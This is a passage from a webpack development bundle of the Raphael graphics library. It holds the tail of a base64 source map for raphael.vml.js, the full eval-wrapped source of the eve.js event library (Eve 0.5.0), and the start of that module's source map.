UFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUFBOyIsInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./dev/raphael.vml.js\n') }, "./node_modules/eve-raphael/eve.js": function (module, exports, __webpack_require__) { eval('var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;// Copyright (c) 2013 Adobe Systems Incorporated. All rights reserved.\n// \n// Licensed under the Apache License, Version 2.0 (the "License");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n// \n// https://www.apache.org/licenses/LICENSE-2.0\n// \n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an "AS IS" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n// ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ \\\\\n// â Eve 0.5.0 - JavaScript Events Library                      â \\\\\n// ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ¤ \\\\\n// â Author Dmitry Baranovskiy (https://dmitry.baranovskiy.com/) â \\\\\n// ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ \\\\\n\n(function (glob) {\n    var version = "0.5.0",\n        has = "hasOwnProperty",\n        separator = /[\\.\\/]/,\n        comaseparator = /\\s*,\\s*/,\n        wildcard = "*",\n        fun = function () {},\n        numsort = function (a, b) {\n            return a - b;\n        },\n        current_event,\n        stop,\n        events = {n: {}},\n        firstDefined = function () {\n            for (var i = 0, ii = this.length; i < ii; i++) {\n                if (typeof this[i] != "undefined") {\n                    return this[i];\n                }\n            }\n        },\n        lastDefined = function () {\n            var i = this.length;\n            while (--i) {\n                if (typeof this[i] != "undefined") {\n                    return this[i];\n                }\n            }\n        },\n        objtos = Object.prototype.toString,\n        Str = String,\n        isArray = Array.isArray || function (ar) {\n            return ar instanceof Array || objtos.call(ar) == "[object Array]";\n        };\n    /*\\\n     * eve\n     [ method ]\n\n     * Fires event with given `name`, given scope and other parameters.\n\n     > Arguments\n\n     - name (string) name of the *event*, dot (`.`) or slash (`/`) separated\n     - scope (object) context for the event handlers\n     - varargs (...) the rest of arguments will be sent to event handlers\n\n     = (object) array of returned values from the listeners. Array has two methods `.firstDefined()` and `.lastDefined()` to get first or last not `undefined` value.\n    \\*/\n        var eve = function (name, scope) {\n            var e = events,\n                oldstop = stop,\n                args = Array.prototype.slice.call(arguments, 2),\n                listeners = eve.listeners(name),\n                z = 0,\n                f = false,\n                l,\n                indexed = [],\n                queue = {},\n                out = [],\n                ce = current_event,\n                errors = [];\n            out.firstDefined = firstDefined;\n            out.lastDefined = lastDefined;\n            current_event = name;\n            stop = 0;\n            for (var i = 0, ii = listeners.length; i < ii; i++) if ("zIndex" in listeners[i]) {\n                indexed.push(listeners[i].zIndex);\n                if (listeners[i].zIndex < 0) {\n                    queue[listeners[i].zIndex] = listeners[i];\n                }\n            }\n            indexed.sort(numsort);\n            while (indexed[z] < 0) {\n                l = queue[indexed[z++]];\n                out.push(l.apply(scope, args));\n                if (stop) {\n                    stop = oldstop;\n                    return out;\n                }\n            }\n            for (i = 0; i < ii; i++) {\n                l = listeners[i];\n                if ("zIndex" in l) {\n                    if (l.zIndex == indexed[z]) {\n                        out.push(l.apply(scope, args));\n                        if (stop) {\n                            break;\n                        }\n                        do {\n                            z++;\n                            l = queue[indexed[z]];\n                            l && out.push(l.apply(scope, args));\n                            if (stop) {\n                                break;\n                            }\n                        } while (l)\n                    } else {\n                        queue[l.zIndex] = l;\n                    }\n                } else {\n                    out.push(l.apply(scope, args));\n                    if (stop) {\n                        break;\n                    }\n                }\n            }\n            stop = oldstop;\n            current_event = ce;\n            return out;\n        };\n        // Undocumented. Debug only.\n        eve._events = events;\n    /*\\\n     * eve.listeners\n     [ method ]\n\n     * Internal method which gives you array of all event handlers that will be triggered by the given `name`.\n\n     > Arguments\n\n     - name (string) name of the event, dot (`.`) or slash (`/`) separated\n\n     = (array) array of event handlers\n    \\*/\n    eve.listeners = function (name) {\n        var names = isArray(name) ? name : name.split(separator),\n            e = events,\n            item,\n            items,\n            k,\n            i,\n            ii,\n            j,\n            jj,\n            nes,\n            es = [e],\n            out = [];\n        for (i = 0, ii = names.length; i < ii; i++) {\n            nes = [];\n            for (j = 0, jj = es.length; j < jj; j++) {\n                e = es[j].n;\n                items = [e[names[i]], e[wildcard]];\n                k = 2;\n                while (k--) {\n                    item = items[k];\n                    if (item) {\n                        nes.push(item);\n                        out = out.concat(item.f || []);\n                    }\n                }\n            }\n            es = nes;\n        }\n        return out;\n    };\n    /*\\\n     * eve.separator\n     [ method ]\n\n     * If for some reasons you donât like default separators (`.` or `/`) you can specify yours\n     * here. Be aware that if you pass a string longer than one character it will be treated as\n     * a list of characters.\n\n     - separator (string) new separator. Empty string resets to default: `.` or `/`.\n    \\*/\n    eve.separator = function (sep) {\n        if (sep) {\n            sep = Str(sep).replace(/(?=[\\.\\^\\]\\[\\-])/g, "\\\\");\n            sep = "[" + sep + "]";\n            separator = new RegExp(sep);\n        } else {\n            separator = /[\\.\\/]/;\n        }\n    };\n    /*\\\n     * eve.on\n     [ method ]\n     **\n     * Binds given event handler with a given name. You can use wildcards â`*`â for the names:\n     | eve.on("*.under.*", f);\n     | eve("mouse.under.floor"); // triggers f\n     * Use @eve to trigger the listener.\n     **\n     - name (string) name of the event, dot (`.`) or slash (`/`) separated, with optional wildcards\n     - f (function) event handler function\n     **\n     - name (array) if you donât want to use separators, you can use array of strings\n     - f (function) event handler function\n     **\n     = (function) returned function accepts a single numeric parameter that represents z-index of the handler. It is an optional feature and only used when you need to ensure that some subset of handlers will be invoked in a given order, despite of the order of assignment. \n     > Example:\n     | eve.on("mouse", eatIt)(2);\n     | eve.on("mouse", scream);\n     | eve.on("mouse", catchIt)(1);\n     * This will ensure that `catchIt` function will be called before `eatIt`.\n     *\n     * If you want to put your handler before non-indexed handlers, specify a negative value.\n     * Note: I assume most of the time you donât need to worry about z-index, but itâs nice to have this feature âjust in caseâ.\n    \\*/\n    eve.on = function (name, f) {\n        if (typeof f != "function") {\n            return function () {};\n        }\n        var names = isArray(name) ? (isArray(name[0]) ? name : [name]) : Str(name).split(comaseparator);\n        for (var i = 0, ii = names.length; i < ii; i++) {\n            (function (name) {\n                var names = isArray(name) ? name : Str(name).split(separator),\n                    e = events,\n                    exist;\n                for (var i = 0, ii = names.length; i < ii; i++) {\n                    e = e.n;\n                    e = e.hasOwnProperty(names[i]) && e[names[i]] || (e[names[i]] = {n: {}});\n                }\n                e.f = e.f || [];\n                for (i = 0, ii = e.f.length; i < ii; i++) if (e.f[i] == f) {\n                    exist = true;\n                    break;\n                }\n                !exist && e.f.push(f);\n            }(names[i]));\n        }\n        return function (zIndex) {\n            if (+zIndex == +zIndex) {\n                f.zIndex = +zIndex;\n            }\n        };\n    };\n    /*\\\n     * eve.f\n     [ method ]\n     **\n     * Returns function that will fire given event with optional arguments.\n     * Arguments that will be passed to the result function will be also\n     * concated to the list of final arguments.\n     | el.onclick = eve.f("click", 1, 2);\n     | eve.on("click", function (a, b, c) {\n     |     console.log(a, b, c); // 1, 2, [event object]\n     | });\n     > Arguments\n     - event (string) event name\n     - varargs (â¦) and any other arguments\n     = (function) possible event handler function\n    \\*/\n    eve.f = function (event) {\n        var attrs = [].slice.call(arguments, 1);\n        return function () {\n            eve.apply(null, [event, null].concat(attrs).concat([].slice.call(arguments, 0)));\n        };\n    };\n    /*\\\n     * eve.stop\n     [ method ]\n     **\n     * Is used inside an event handler to stop the event, preventing any subsequent listeners from firing.\n    \\*/\n    eve.stop = function () {\n        stop = 1;\n    };\n    /*\\\n     * eve.nt\n     [ method ]\n     **\n     * Could be used inside event handler to figure out actual name of the event.\n     **\n     > Arguments\n     **\n     - subname (string) #optional subname of the event\n     **\n     = (string) name of the event, if `subname` is not specified\n     * or\n     = (boolean) `true`, if current eventâs name contains `subname`\n    \\*/\n    eve.nt = function (subname) {\n        var cur = isArray(current_event) ? current_event.join(".") : current_event;\n        if (subname) {\n            return new RegExp("(?:\\\\.|\\\\/|^)" + subname + "(?:\\\\.|\\\\/|$)").test(cur);\n        }\n        return cur;\n    };\n    /*\\\n     * eve.nts\n     [ method ]\n     **\n     * Could be used inside event handler to figure out actual name of the event.\n     **\n     **\n     = (array) names of the event\n    \\*/\n    eve.nts = function () {\n        return isArray(current_event) ? current_event : current_event.split(separator);\n    };\n    /*\\\n     * eve.off\n     [ method ]\n     **\n     * Removes given function from the list of event listeners assigned to given name.\n     * If no arguments specified all the events will be cleared.\n     **\n     > Arguments\n     **\n     - name (string) name of the event, dot (`.`) or slash (`/`) separated, with optional wildcards\n     - f (function) event handler function\n    \\*/\n    /*\\\n     * eve.unbind\n     [ method ]\n     **\n     * See @eve.off\n    \\*/\n    eve.off = eve.unbind = function (name, f) {\n        if (!name) {\n            eve._events = events = {n: {}};\n            return;\n        }\n        var names = isArray(name) ? (isArray(name[0]) ? name : [name]) : Str(name).split(comaseparator);\n        if (names.length > 1) {\n            for (var i = 0, ii = names.length; i < ii; i++) {\n                eve.off(names[i], f);\n            }\n            return;\n        }\n        names = isArray(name) ? name : Str(name).split(separator);\n        var e,\n            key,\n            splice,\n            i, ii, j, jj,\n            cur = [events];\n        for (i = 0, ii = names.length; i < ii; i++) {\n            for (j = 0; j < cur.length; j += splice.length - 2) {\n                splice = [j, 1];\n                e = cur[j].n;\n                if (names[i] != wildcard) {\n                    if (e[names[i]]) {\n                        splice.push(e[names[i]]);\n                    }\n                } else {\n                    for (key in e) if (e[has](key)) {\n                        splice.push(e[key]);\n                    }\n                }\n                cur.splice.apply(cur, splice);\n            }\n        }\n        for (i = 0, ii = cur.length; i < ii; i++) {\n            e = cur[i];\n            while (e.n) {\n                if (f) {\n                    if (e.f) {\n                        for (j = 0, jj = e.f.length; j < jj; j++) if (e.f[j] == f) {\n                            e.f.splice(j, 1);\n                            break;\n                        }\n                        !e.f.length && delete e.f;\n                    }\n                    for (key in e.n) if (e.n[has](key) && e.n[key].f) {\n                        var funcs = e.n[key].f;\n                        for (j = 0, jj = funcs.length; j < jj; j++) if (funcs[j] == f) {\n                            funcs.splice(j, 1);\n                            break;\n                        }\n                        !funcs.length && delete e.n[key].f;\n                    }\n                } else {\n                    delete e.f;\n                    for (key in e.n) if (e.n[has](key) && e.n[key].f) {\n                        delete e.n[key].f;\n                    }\n                }\n                e = e.n;\n            }\n        }\n    };\n    /*\\\n     * eve.once\n     [ method ]\n     **\n     * Binds given event handler with a given name to only run once then unbind itself.\n     | eve.once("login", f);\n     | eve("login"); // triggers f\n     | eve("login"); // no listeners\n     * Use @eve to trigger the listener.\n     **\n     > Arguments\n     **\n     - name (string) name of the event, dot (`.`) or slash (`/`) separated, with optional wildcards\n     - f (function) event handler function\n     **\n     = (function) same return function as @eve.on\n    \\*/\n    eve.once = function (name, f) {\n        var f2 = function () {\n            eve.off(name, f2);\n            return f.apply(this, arguments);\n        };\n        return eve.on(name, f2);\n    };\n    /*\\\n     * eve.version\n     [ property (string) ]\n     **\n     * Current version of the library.\n    \\*/\n    eve.version = version;\n    eve.toString = function () {\n        return "You are running Eve " + version;\n    };\n    ( true && module.exports) ? (module.exports = eve) : ( true ? (!(__WEBPACK_AMD_DEFINE_ARRAY__ = [], __WEBPACK_AMD_DEFINE_RESULT__ = (function() { return eve; }).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),\n\t\t\t\t__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__))) : (undefined));\n})(this);\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9ub2RlX21vZHVsZXMvZXZlLXJhcGhhZWwvZXZlLmpzLmpzIiwic291cmNlcyI6WyJ3ZWJwYWNrOi8vUmFwaGFlbC8uL25vZGVfbW9kdWxlcy9ldmUtcmFwaGFlbC9ldmUuanM/ZDJiNCJdLCJzb3VyY2VzQ29udGVudCI6WyIvLyBDb3B5cmlnaHQgKGMpIDIwMTMgQWRvYmUgU3lzdGVtcyBJbmNvcnBvcmF0ZWQuIEFsbCByaWdodHMgcmVzZXJ2ZWQuXG4vLyBcbi8vIExpY2Vuc2VkIHVuZGVyIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvbiAyLjAgKHRoZSBcIkxpY2Vuc2VcIik7XG4vLyB5b3UgbWF5IG5vdCB1c2UgdGhpcyBmaWxlIGV4Y2VwdCBpbiBjb21wbGlhbmNlIHdpdGggdGhlIExpY2Vuc2UuXG4vLyBZb3UgbWF5IG9idGFpbiBhIGNvcHkgb2YgdGhlIExpY2Vuc2UgYXRcbi8vIFxuLy8gaHR0cDovL3d3dy5hcGFjaGUub3JnL2xpY2Vuc2VzL0xJQ0VOU0UtMi4wXG4vLyBcbi8vIFVubGVzcyByZXF1aXJlZCBieSBhcHBsaWNhYmxlIGxhdyBvciBhZ3JlZWQgdG8gaW4gd3JpdGluZywgc29mdHdhcmVcbi8vIGRpc3RyaWJ1dGVkIHVuZGVyIHRoZSBMaWNlbnNlIGlzIGRpc3RyaWJ1dGVkIG9uIGFuIFwiQVMgSVNcIiBCQVNJUyxcbi8vIFdJVEhPVVQgV0FSUkFOVElFUyBPUiBDT05ESVRJT05TIE9GIEFOWSBLSU5ELCBlaXRoZXIgZXhwcmVzcyBvciBpbXBsaWVkLlxuLy8gU2VlIHRoZSBMaWNlbnNlIGZvciB0aGUgc3BlY2lmaWMgbGFuZ3VhZ2UgZ292ZXJuaW5nIHBlcm1pc3Npb25zIGFuZFxuLy8gbGltaXRhdGlvbnMgdW5kZXIgdGhlIExpY2Vuc2UuXG4vLyDilIzilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilJAgXFxcXFxuLy8g4pSCIEV2ZSAwLjUuMCAtIEphdmFTY3JpcHQgRXZlbnRzIExpYnJhcnkgICAgICAgICAgICAgICAgICAgICAg4pSCIFxcXFxcbi8vIOKUnOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUpCBcXFxcXG4vLyDilIIgQXV0aG9yIERtaXRyeSBCYXJhbm92c2tpeSAoaHR0cDovL2RtaXRyeS5iYXJhbm92c2tpeS5jb20vKSDilIIgXFxcXFxuLy8g4pSU4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSYIFxcXFxcblxuKGZ1bmN0aW9uIChnbG9iKSB7XG4gICAgdmFyIHZlcnNpb24gPSBcIjAuNS4wXCIsXG4gICAgICAgIGhhcyA9IFwiaGFzT3duUHJvcGVydHlcIixcbiAgICAgICAgc2VwYXJhdG9yID0gL1tcXC5cXC9dLyxcbiAgICAgICAgY29tYXNlcGFyYXRvciA9IC9cXHMqLFxccyovLFxuICAgICAgICB3aWxkY2FyZCA9IFwiKlwiLFxuICAgICAgICBmdW4gPSBmdW5jdGlvbiAoKSB7fSxcbiAgICAgICAgbnVtc29ydCA9IGZ1bmN0aW9uIChhLCBiKSB7XG4gICAgICAgICAgICByZXR1cm4gYSAtIGI7XG4gICAgICAgIH0sXG4gICAgICAgIGN1cnJlbnRfZXZlbnQsXG4gICAgICAgIHN0b3AsXG4gICAgICAgIGV2ZW50cyA9IHtuOiB7fX0sXG4gICAgICAgIGZpcnN0RGVmaW5lZCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IHRoaXMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgdGhpc1tpXSAhPSBcInVuZGVmaW5lZFwiKSB7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB0aGlzW2ldO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfSxcbiAgICAgICAgbGFzdERlZmluZWQgPSBmdW5jdGlvbiAoKSB7XG4gICAg